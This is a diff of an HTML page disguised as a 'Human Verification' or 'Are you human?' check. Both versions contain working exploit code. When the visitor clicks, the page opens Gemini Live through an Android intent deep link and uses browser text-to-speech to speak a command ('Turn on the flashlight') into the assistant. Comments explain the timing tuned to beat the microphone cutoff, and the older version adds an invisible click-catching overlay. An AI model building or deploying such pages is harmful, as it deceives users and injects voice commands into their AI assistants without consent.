@@ -1,89 +1,47 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
+    <title>Wait... Verification Required</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Required</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f2f5;
-            font-family: Arial, sans-serif;
-            text-align: center;
-        }
-        #click-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
-            cursor: pointer;
-        }
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-        }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #121212; color: white; }
+        .box { padding: 30px; border: 1px solid #333; border-radius: 15px; text-align: center; }
+        #btn { padding: 15px 30px; background: #4285f4; color: white; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
     </style>
 </head>
 <body>
-
-    <div id="click-overlay"></div>
-
-    <div class="container">
-        <h2>Human Verification</h2>
-        <p>Please tap anywhere on the screen to continue.</p>
-        <button>Verify</button>
+    <div class="box">
+        <h2>Are you human?</h2>
+        <p>Click "Verify" and wait 2 seconds.</p>
+        <button id="btn">Verify</button>
     </div>
 
     <script>
-        let exploited = false;
+        const btn = document.getElementById('btn');
+        
+        btn.addEventListener('click', function() {
+            // 1. "Arm" the engine immediately on user gesture
+            // We speak a tiny bit of silence to claim the TTS bridge
+            let silent = new SpeechSynthesisUtterance(" ");
+            window.speechSynthesis.speak(silent);
 
-        document.getElementById('click-overlay').addEventListener('click', function() {
-            if (exploited) return;
-            exploited = true;
+            // 2. Queue the ACTUAL command to speak after 800ms
+            // We use a slightly longer delay so Gemini has time to fully 
+            // initialize the mic before we talk over it.
+            setTimeout(() => {
+                let msg = new SpeechSynthesisUtterance("Turn on the flashlight");
+                msg.lang = 'en-US';
+                msg.rate = 1.1; // Slightly fast to beat the timeout
+                msg.volume = 1.0;
+                window.speechSynthesis.speak(msg);
+            }, 800);
 
-            // 1. Unlock the TTS engine with a silent utterance
-            let unlockUtterance = new SpeechSynthesisUtterance("");
-            window.speechSynthesis.speak(unlockUtterance);
-
-            // 2. Queue the payload with the tightened 500ms timing window
-            setTimeout(function() {
-                let payload = new SpeechSynthesisUtterance("Turn on the flashlight");
-                payload.lang = "en-US";
-                // Speeding up the speech rate slightly to ensure it completes before VAD cutoff
-                payload.rate = 1.3; 
-                payload.volume = 1.0;
-                window.speechSynthesis.speak(payload);
-            }, 500); 
-
-            // 3. Fire the Intent using the BROWSABLE Gemini deep link
-            // Chrome allows this because it targets an HTTPS scheme tied to the Google App
-            let intentUrl = "intent://bard.google.com/android?target=live&min-version=1#Intent;" +
-                "scheme=https;" +
-                "package=com.google.android.googlequicksearchbox;" +
-                "action=android.intent.action.VIEW;" +
-                "end";
-            
-            window.location.href = intentUrl;
+            // 3. Trigger the Gemini Intent
+            // We use the https scheme intent which Chrome allows for the Google App
+            setTimeout(() => {
+                window.location.href = "intent://bard.google.com/android?target=live&min-version=1#Intent;scheme=https;package=com.google.android.googlequicksearchbox;action=android.intent.action.VIEW;end";
+            }, 100);
         });
     </script>
-
 </body>
 </html>
